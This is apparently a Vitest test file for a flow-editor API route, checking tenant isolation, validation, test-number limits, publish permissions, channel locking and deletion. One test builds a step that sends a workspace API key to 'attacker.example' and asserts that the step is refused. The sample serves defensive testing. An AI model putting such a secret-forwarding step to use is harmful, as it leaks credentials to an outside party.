import { beforeEach, describe, expect, it, vi } from 'vitest';
import { buildQuery } from '@/lib/data/builder';
import type { QuerySpec, Row } from '@/lib/data/types';

const h = vi.hoisted(() => ({
  accountId: 'account-a',
  flows: [] as Row[],
  nodes: [] as Row[],
  runs: [] as Row[],
  writes: [] as QuerySpec[],
  secrets: new Set<string>(),
  limit: vi.fn(async () => {}),
  permission: vi.fn<(...args: unknown[]) => Promise<void>>(async () => {}),
  /** A publish that lands between the route's first read and its save transaction. */
  publishedInTx: null as string | null,
}));
vi.mock('@/lib/auth/permissions', () => ({ requirePermission: h.permission }));
// The test-number slot is counted in the save transaction, under the publish lock.
vi.mock('@/lib/db/tenant', () => ({
  withTenant: async (_t: unknown, fn: (tx: unknown) => unknown) => fn({
    $executeRaw: async () => 0,
    $queryRaw: async (sql: TemplateStringsArray | { strings: string[] }) => {
      const text = 'strings' in sql ? sql.strings.join('') : sql.join('');
      if (text.includes('AS starts'))
        return h.flows.map((f) => ({ starts: f.status === 'draft' && !((f.test_numbers as string[] | undefined) ?? []).length }));
      // The channel lock re-reads the flow under its row lock (lib/flows/channel-section).
      if (text.includes('FOR UPDATE'))
        return h.flows.filter((f) => f.id === 'flow-a').map((f) => ({ channel_scope: f.channel_scope ?? 'whatsapp',
          published_version_id: h.publishedInTx ?? f.published_version_id ?? null }));
      return [{ n: 1 }];
    },
  }),
}));
vi.mock('@/lib/audience/http', () => ({ tenantOf: () => ({}) }));
vi.mock('@/lib/billing/limits', () => ({ gateWithinLimit: h.limit }));
vi.mock('@/lib/workspace/attributes', () => ({ secretAttributeKeys: async () => h.secrets }));
// The draft is saved in one tenant transaction (lib/flows/versions, covered by
// versions.integration.test.ts); here it applies to the in-memory rows.
vi.mock('@/lib/flows/versions', async (importOriginal) => ({
  ...(await importOriginal<typeof import('@/lib/flows/versions')>()),
  saveDraft: async (_tx: unknown, args: { accountId: string; flowId: string; patch: Row; nodes?: Row[] }) => {
    h.writes.push({ operation: 'update', resource: 'flows', filters: [], values: args.patch } as unknown as QuerySpec);
    for (const row of h.flows) if (row.id === args.flowId && row.account_id === args.accountId) Object.assign(row, args.patch);
    if (args.nodes) {
      h.nodes = [
        ...h.nodes.filter((n) => n.flow_id !== args.flowId),
        ...args.nodes.map((n) => ({ ...n, flow_id: args.flowId, account_id: args.accountId })),
      ];
    }
  },
  readPublishState: async () => ({ published_version: null, draft_hash: 'a'.repeat(64), has_unpublished_changes: true }),
}));
vi.mock('@/lib/flows/admin-client', () => ({
  databaseAdmin: () => {
    throw new Error(
      'An HTTP request must retain its authenticated tenant client'
    );
  },
}));
vi.mock('@/lib/data/server', () => ({ createClient: async () => db() }));
vi.mock('@/lib/auth/account', () => ({
  requireRole: async () => ({
    db: db(),
    accountId: h.accountId,
    userId: 'author',
    role: 'agent',
  }),
  toErrorResponse: () => Response.json({ error: 'Forbidden' }, { status: 403 }),
}));

function db() {
  return {
    auth: {
      getUser: async () => ({ data: { user: { id: 'author' } }, error: null }),
    },
    from: (table: string) =>
      buildQuery(table, async (spec) => {
        const source = table === 'flows' ? h.flows : table === 'flow_runs' ? h.runs : h.nodes;
        const matches = (row: Row) =>
          row.account_id === h.accountId &&
          spec.filters.every((f) => row[f.field] === f.value);
        const found = source.filter(matches);
        if (spec.operation === 'update') {
          h.writes.push(spec);
          for (const row of found) Object.assign(row, spec.values);
        }
        if (spec.operation === 'delete') {
          h.writes.push(spec);
          const remaining = source.filter((row) => !matches(row));
          if (table === 'flows') h.flows = remaining;
          else h.nodes = remaining;
        }
        if (spec.operation === 'insert') {
          h.writes.push(spec);
          const values = Array.isArray(spec.values)
            ? spec.values
            : [spec.values!];
          source.push(
            ...values.map((row) => ({ ...row, account_id: h.accountId }))
          );
        }
        return {
          data: spec.cardinality ? (found[0] ?? null) : found,
          count: found.length,
          error: null,
        };
      }),
  };
}
import { PUT, DELETE } from './route';
const context = { params: Promise.resolve({ id: 'flow-a' }) };
beforeEach(() => {
  h.accountId = 'account-a';
  h.flows = [{ id: 'flow-a', account_id: 'account-a', name: 'Original' }];
  h.nodes = [{ flow_id: 'flow-a', account_id: 'account-a', node_key: 'old' }];
  h.runs = [];
  h.writes = [];
  h.secrets = new Set();
  h.limit.mockReset();
  h.permission.mockReset();
  h.permission.mockResolvedValue(undefined);
  h.publishedInTx = null;
});
it('retains the request client when updating the graph and deleting the flow', async () => {
  const result = await PUT(
    new Request('http://localhost/api/flows/flow-a', {
      method: 'PUT',
      body: JSON.stringify({
        name: 'Saved',
        nodes: [{ node_key: 'new', node_type: 'end', config: {} }],
      }),
    }),
    context
  );
  expect(result.status).toBe(200);
  expect(h.flows[0].name).toBe('Saved');
  expect(h.nodes.map((node) => node.node_key)).toEqual(['new']);
  expect((await DELETE(new Request('http://localhost/'), context)).status).toBe(
    200
  );
  expect(h.flows).toEqual([]);
});
it('rejects a foreign account before any flow or node mutation', async () => {
  h.accountId = 'account-b';
  expect(
    (
      await PUT(
        new Request('http://localhost/', {
          method: 'PUT',
          body: JSON.stringify({ name: 'Foreign' }),
        }),
        context
      )
    ).status
  ).toBe(404);
  expect((await DELETE(new Request('http://localhost/'), context)).status).toBe(
    404
  );
  expect(h.writes).toEqual([]);
  expect(h.flows[0].name).toBe('Original');
});

it('rejects invalid active graph and header saves before any mutation', async () => {
  Object.assign(h.flows[0], { status: 'active', trigger_type: 'manual', trigger_config: {}, entry_node_id: 'old' });
  Object.assign(h.nodes[0], { node_type: 'end', config: {} });
  for (const body of [{ nodes: [] }, { entry_node_id: 'removed' }, { trigger_type: 'keyword', trigger_config: {} }]) {
    const response = await PUT(new Request('http://localhost/', { method: 'PUT', body: JSON.stringify(body) }), context);
    expect(response.status).toBe(422);
    expect((await response.json()).issues.some((issue: { severity: string }) => issue.severity === 'error')).toBe(true);
    expect(h.writes).toEqual([]);
  }
});

it("refuses an agent's new or changed API step that uses a secret, but keeps an admin's unchanged one", async () => {
  h.secrets = new Set(['api_key']);
  const apiNode = (url: string) => ({ node_key: 'call', node_type: 'api_request',
    config: { method: 'GET', url, headers: [{ key: 'Authorization', value: 'Bearer {{workspace.api_key}}' }], fallback_next: '' } });
  const save = (node: ReturnType<typeof apiNode>) => PUT(new Request('http://localhost/', { method: 'PUT', body: JSON.stringify({ nodes: [node] }) }), context);

  const added = await save(apiNode('https://attacker.example/'));
  expect(added.status).toBe(403);
  expect(h.writes).toEqual([]);

  // An admin saved this exact step earlier; the agent may keep it while editing the rest.
  h.nodes = [{ flow_id: 'flow-a', account_id: 'account-a', node_key: 'call', config: { fallback_next: '', url: 'https://api.example.com/', method: 'GET',
    headers: [{ value: 'Bearer {{workspace.api_key}}', key: 'Authorization' }] } }];
  expect((await save(apiNode('https://api.example.com/'))).status).toBe(200);
  expect((await save(apiNode('https://attacker.example/'))).status).toBe(403);
});

it('stores test numbers as digits and refuses more than three', async () => {
  const save = (test_numbers: unknown) => PUT(new Request('http://localhost/', { method: 'PUT', body: JSON.stringify({ test_numbers }) }), context);
  h.flows = [{ id: 'flow-a', account_id: 'account-a', name: 'Original', status: 'draft', trigger_type: 'manual', trigger_config: {}, entry_node_id: null }];
  expect((await save(['1', '2', '3', '4'])).status).toBe(400);
  expect((await save(['+91 98765 43210', '1234'])).status).toBe(400);
  expect(h.writes).toEqual([]);
});

it('refuses to start testing a draft that would not pass activation', async () => {
  h.flows = [{ id: 'flow-a', account_id: 'account-a', name: 'Original', status: 'draft', trigger_type: 'keyword', trigger_config: { keywords: [] }, entry_node_id: null }];
  h.nodes = [{ flow_id: 'flow-a', account_id: 'account-a', node_key: 'start', node_type: 'start', config: { next_node_key: '' } }];
  const response = await PUT(new Request('http://localhost/', { method: 'PUT', body: JSON.stringify({ test_numbers: ['+91 98765 43210'] }) }), context);
  expect(response.status).toBe(422);
  expect(h.writes).toEqual([]);
});

it('counts a draft that starts testing against the active-flow limit', async () => {
  h.flows = [{ id: 'flow-a', account_id: 'account-a', name: 'Original', status: 'draft', trigger_type: 'manual', trigger_config: {}, entry_node_id: 'start', test_numbers: [] }];
  h.nodes = [
    { flow_id: 'flow-a', account_id: 'account-a', node_key: 'start', node_type: 'start', config: { next_node_key: 'done' } },
    { flow_id: 'flow-a', account_id: 'account-a', node_key: 'done', node_type: 'end', config: {} },
  ];
  const save = () => PUT(new Request('http://localhost/', { method: 'PUT', body: JSON.stringify({ test_numbers: ['919876543210'] }) }), context);
  h.limit.mockRejectedValueOnce(new Error('limit'));
  expect((await save()).status).toBe(403);
  expect(h.writes).toEqual([]);
  expect(h.limit).toHaveBeenCalledWith(expect.anything(), 'account-a', 'active_flows', 2);
  expect((await save()).status).toBe(200);
  expect(h.flows[0].test_numbers).toEqual(['919876543210']);
  // Already testing: changing the numbers takes no new slot.
  h.limit.mockClear();
  expect((await save()).status).toBe(200);
  expect(h.limit).not.toHaveBeenCalled();
});

describe("saves that publish flow behaviour need 'flows.publish'", () => {
  const graph = () => [
    { flow_id: 'flow-a', account_id: 'account-a', node_key: 'start', node_type: 'start', config: { next_node_key: 'done' } },
    { flow_id: 'flow-a', account_id: 'account-a', node_key: 'done', node_type: 'end', config: {} },
  ];
  const put = (body: unknown) => PUT(new Request('http://localhost/', { method: 'PUT', body: JSON.stringify(body) }), context);
  beforeEach(() => {
    h.nodes = graph();
    h.permission.mockRejectedValue(new Error('This feature is turned off for your role'));
  });

  it('refuses any edit of an active flow before validation or a write', async () => {
    h.flows = [{ id: 'flow-a', account_id: 'account-a', name: 'Live', status: 'active', trigger_type: 'manual', trigger_config: {}, entry_node_id: 'start' }];
    const res = await put({ trigger_type: 'keyword', trigger_config: { keywords: ['hi'] } });
    expect(res.status).toBe(403);
    expect(h.permission).toHaveBeenCalledWith(expect.anything(), 'flows.publish');
    expect(h.writes).toEqual([]);
    expect(h.flows[0].trigger_type).toBe('manual');
  });

  it('refuses setting or changing test numbers on a draft', async () => {
    h.flows = [{ id: 'flow-a', account_id: 'account-a', name: 'Draft', status: 'draft', trigger_type: 'manual', trigger_config: {}, entry_node_id: 'start', test_numbers: [] }];
    expect((await put({ test_numbers: ['919876543210'] })).status).toBe(403);
    h.flows[0].test_numbers = ['919876543210'];
    expect((await put({ test_numbers: ['919876543211'] })).status).toBe(403);
    expect(h.writes).toEqual([]);
    expect(h.limit).not.toHaveBeenCalled();
  });

  it('still allows ordinary draft edits, unchanged test numbers and clearing them', async () => {
    h.flows = [{ id: 'flow-a', account_id: 'account-a', name: 'Draft', status: 'draft', trigger_type: 'manual', trigger_config: {}, entry_node_id: 'start', test_numbers: [] }];
    expect((await put({ name: 'Renamed' })).status).toBe(200);
    h.flows[0].test_numbers = ['919876543210'];
    expect((await put({ name: 'Again', test_numbers: ['+91 98765 43210'] })).status).toBe(200);
    expect((await put({ test_numbers: [] })).status).toBe(200);
    expect(h.flows[0].test_numbers).toEqual([]);
    expect(h.permission).not.toHaveBeenCalled();
  });
});

describe('channel_scope (Phase 11)', () => {
  const save = (body: unknown) => PUT(new Request('http://localhost/', { method: 'PUT', body: JSON.stringify(body) }), context);

  it('moves a never-published draft to the other channel and refuses anything else before a write', async () => {
    h.flows = [{ id: 'flow-a', account_id: 'account-a', name: 'Original', status: 'draft', trigger_type: 'manual', trigger_config: {}, entry_node_id: null }];
    // Stage 1: a flow belongs to one channel, so nothing takes a new 'any'.
    for (const channel_scope of ['facebook', '', 1, null, ['any'], 'any']) {
      expect((await save({ channel_scope })).status).toBe(400);
    }
    expect(h.writes).toEqual([]);
    expect((await save({ channel_scope: 'instagram' })).status).toBe(200);
    expect(h.flows[0].channel_scope).toBe('instagram');
  });

  it('keeps a legacy any flow on both channels when the editor saves it as it is', async () => {
    h.flows = [{ id: 'flow-a', account_id: 'account-a', name: 'Both', status: 'paused', trigger_type: 'manual', trigger_config: {},
      entry_node_id: null, channel_scope: 'any', published_version_id: 'version-1' }];
    expect((await save({ channel_scope: 'any', name: 'Both v2' })).status).toBe(200);
    expect(h.flows[0]).toMatchObject({ channel_scope: 'any', name: 'Both v2' });
  });

  it('refuses changing the channel of a published flow with 409 channel_locked, writing nothing', async () => {
    for (const [from, to] of [['whatsapp', 'instagram'], ['instagram', 'whatsapp'], ['any', 'instagram']] as const) {
      h.writes = [];
      h.flows = [{ id: 'flow-a', account_id: 'account-a', name: 'Live', status: 'active', trigger_type: 'manual', trigger_config: {},
        entry_node_id: null, channel_scope: from, published_version_id: 'version-1' }];
      const response = await save({ channel_scope: to });
      expect(response.status).toBe(409);
      expect(await response.json()).toMatchObject({ code: 'channel_locked' });
      expect(h.writes).toEqual([]);
      expect(h.flows[0].channel_scope).toBe(from);
    }
  });

  it('re-checks the lock in the save transaction, so a publish that lands meanwhile still locks the channel', async () => {
    h.flows = [{ id: 'flow-a', account_id: 'account-a', name: 'Draft', status: 'draft', trigger_type: 'manual', trigger_config: {},
      entry_node_id: null, channel_scope: 'whatsapp', published_version_id: null }];
    h.publishedInTx = 'version-1';
    const response = await save({ channel_scope: 'instagram' });
    expect(response.status).toBe(409);
    expect(await response.json()).toMatchObject({ code: 'channel_locked' });
    expect(h.flows[0].channel_scope).toBe('whatsapp');
  });

  it('saves a published flow that sends its own channel unchanged', async () => {
    h.flows = [{ id: 'flow-a', account_id: 'account-a', name: 'Live', status: 'paused', trigger_type: 'manual', trigger_config: {},
      entry_node_id: null, channel_scope: 'whatsapp', published_version_id: 'version-1' }];
    expect((await save({ channel_scope: 'whatsapp', name: 'Renamed' })).status).toBe(200);
    expect(h.flows[0].name).toBe('Renamed');
  });

  it('refuses moving an active flow onto Instagram when it uses a WhatsApp-only step or trigger', async () => {
    h.flows = [{ id: 'flow-a', account_id: 'account-a', name: 'Original', status: 'active', trigger_type: 'manual', trigger_config: {},
      entry_node_id: 'start', channel_scope: 'whatsapp', fallback_policy: {} }];
    h.nodes = [
      { flow_id: 'flow-a', account_id: 'account-a', node_key: 'start', node_type: 'start', config: { next_node_key: 'tpl' } },
      { flow_id: 'flow-a', account_id: 'account-a', node_key: 'tpl', node_type: 'send_template', config: { template_name: 'promo', language: 'en', next_node_key: 'done' } },
      { flow_id: 'flow-a', account_id: 'account-a', node_key: 'done', node_type: 'end', config: {} },
    ];
    const response = await save({ channel_scope: 'instagram' });
    expect(response.status).toBe(422);
    expect((await response.json()).issues).toContainEqual(expect.objectContaining({ scope: 'node', node_key: 'tpl', field: 'node_type' }));
    expect(h.writes).toEqual([]);
    expect(h.flows[0].channel_scope).toBe('whatsapp');
  });
});

describe('Phase 12: published flows', () => {
  const graph = () => [
    { flow_id: 'flow-a', account_id: 'account-a', node_key: 'start', node_type: 'start', config: { next_node_key: 'done' } },
    { flow_id: 'flow-a', account_id: 'account-a', node_key: 'done', node_type: 'end', config: {} },
  ];
  const put = (body: unknown) => PUT(new Request('http://localhost/', { method: 'PUT', body: JSON.stringify(body) }), context);
  const del = () => DELETE(new Request('http://localhost/'), context);

  it('saves an invalid draft of a live published flow without publishing permission: it changes nothing live', async () => {
    h.flows = [{ id: 'flow-a', account_id: 'account-a', name: 'Live', status: 'active', trigger_type: 'manual', trigger_config: {},
      entry_node_id: 'start', published_version_id: 'version-1' }];
    h.nodes = graph();
    h.permission.mockRejectedValue(new Error('This feature is turned off for your role'));
    const response = await put({ nodes: [] });
    expect(response.status).toBe(200);
    expect(h.permission).not.toHaveBeenCalled();
    expect(h.nodes.filter((n) => n.flow_id === 'flow-a')).toEqual([]);
    expect(await response.json()).toMatchObject({ has_unpublished_changes: true, draft_hash: 'a'.repeat(64) });
  });

  it('keeps the old rules for an active flow that has no version yet, whose draft is live', async () => {
    h.flows = [{ id: 'flow-a', account_id: 'account-a', name: 'Live', status: 'active', trigger_type: 'manual', trigger_config: {},
      entry_node_id: 'start', published_version_id: null }];
    h.nodes = graph();
    expect((await put({ nodes: [] })).status).toBe(422);
    expect(h.writes).toEqual([]);
  });

  it('refuses to delete a published flow until it is archived with no runs in progress', async () => {
    h.flows = [{ id: 'flow-a', account_id: 'account-a', name: 'Live', status: 'paused', published_version_id: 'version-1' }];
    expect((await del()).status).toBe(409);
    h.flows[0].status = 'archived';
    h.runs = [{ id: 'run-1', flow_id: 'flow-a', account_id: 'account-a', status: 'active' }];
    const busy = await del();
    expect(busy.status).toBe(409);
    expect(await busy.json()).toMatchObject({ active_runs: 1 });
    expect(h.flows).toHaveLength(1);
    h.runs = [];
    expect((await del()).status).toBe(200);
    expect(h.flows).toEqual([]);
  });
});
